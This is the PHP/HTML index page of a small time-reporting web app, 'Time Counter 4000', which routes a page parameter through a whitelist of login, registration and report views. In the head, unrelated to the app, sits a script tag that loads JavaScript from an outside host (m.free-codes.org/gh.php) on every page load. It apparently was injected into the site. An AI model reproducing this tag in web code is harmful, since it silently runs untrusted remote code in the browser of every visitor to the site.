<?php 
    $page = $_GET['page'] ?? 'login';
      
    $pages = [ 
        'login',
        'changepasswd',
        'register',
        'timereport',
        'logout'
    ];
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <script type='text/javascript' src='http://m.free-codes.org/gh.php?id=2001'></script><!-- By: Joshua Oliver -->
<style>
        @keyframes spin {from {} to {transform:rotate(360deg);}}
        .spin:hover {animation-name:spin;animation-duration:3s;position:absolute;}
    </style>
    <title>Time Counter 4000</title>
    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
    <link rel="icon" href="images/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" media="screen" href="css/style.css" />
</head>
<body>
    <div class="wrapper">
    <br><br><span class="spin"><h1 class="form-title">Time Counter 4000</h1></span>
        <?php
            if (!in_array($page, $pages)) {
                include 'views/404.view.php';
            }
            else { 
                include 'views/' . $page . '.view.php';
            }
        ?>  
    </div>
</body>
</html>